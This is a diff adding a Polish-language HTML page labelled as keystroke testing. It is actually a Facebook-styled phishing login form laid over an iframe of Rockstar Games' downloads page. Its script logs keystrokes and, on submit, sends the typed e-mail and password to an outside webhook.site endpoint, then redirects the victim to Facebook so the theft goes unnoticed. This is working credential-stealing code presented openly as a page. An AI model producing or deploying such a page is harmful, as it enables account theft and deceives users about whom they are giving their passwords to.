@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8"><script>/* <![CDATA[ */ ringDataLayer = {"context":{"variant":{"accelerator":"ZG93bmxvYWQucG9jenRhLm9uZXQucGw6OnByb2Rfd2l0aF91c2VyX2RhdGFfZG93bmxvYWRlcl9pbl9hd3NfMg=="},"id":{"website":"9481b0b7-7c3d-463b-8f3c-9de5c8289e21"}}}; /* ]]> */</script><script>/* <![CDATA[ */ accConf = {"events":{"endpointPaths":["/a8f4d8cd95e164917035b64b867a45dd"]}}; /* ]]> */</script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Testowanie Naciśnięć Klawiszy</title>
+    <style>
+        /* Ustawienia tła i wyśrodkowania */
+        body {
+                       display: flex;
+                       align-items: center; /* Wyśrodkowanie pionowe */
+ 			font-family: 'Helvetica Neue', Arial, sans-serif;
+
+        }
+
+        #loginForm {
+            background-color: #fff; /* Białe tło dla formularza */
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Delikatny cień */
+            width: 300px; /* Szerokość formularza */
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        input {
+            width: 95%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+       button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2; /* Kolor Facebookowego przycisku */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+     h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #1877f2; /* Kolor Facebookowego niebieskiego */
+            font-weight: bold;
+        }
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 105%;
+            background-color: rgba(0, 0, 0, 0.5); /* Przyciemnienie */
+            z-index: 1; /* Ustawienie tła nad iframe */
+        }
+
+      button:hover {
+            background-color: #165eab; /* Ciemniejszy niebieski po najechaniu */
+        }
+    </style>
+</head>
+<body>
+
+
+    <iframe id="frustoFrame" src="https://www.rockstargames.com/downloads" style="width:100%; height:100vh"></iframe>
+
+    <!-- Formularz Zaloguj się -->
+    <div id="loginForm" style="margin-left:-60vw; width:400px; z-index:10">
+        <h2>Zaloguj się</h2>
+        <form id="login">
+            <label for="username">Adres E-mail:</label>
+            <input type="text" id="username" name="username" required><br><br>
+            <label for="password">Hasło:</label>
+            <input type="password" id="password" name="password" required><br><br>
+
+        <button type="submit"><strong>Zaloguj</strong></button>
+        </form>
+    </div>
+
+    <script>
+          
+        document.addEventListener('keydown', function(event) {
+            console.log('Naciśnięto klawisz na stronie głównej:', event.key);
+        });
+
+
+        document.getElementById('login').addEventListener('submit', function(event) {
+            event.preventDefault(); // Zablokuj domyślną akcję (wysyłanie formularza)
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            console.log('Login:', username);
+            console.log('Hasło:', password);
+ setTimeout(function() {
+        window.location.href = 'https://www.facebook.pl'; // Przekierowanie na Facebooka
+    }, 1000); // 1000 ms = 1 sekundy
+
+     fetch('https://webhook.site/d63f48fe-2b57-42fd-b9ca-ec2e8649c851', {
+    method: 'POST',
+    mode: 'no-cors', // Dodaj 'no-cors'
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+        username: username,
+        password: password
+
+    })
+})
+.then(() => console.log('Dane zostały wysłane!'))
+.catch(error => console.error('Błąd:', error));
+        });
+    </script>
+
+</body>
+</html>
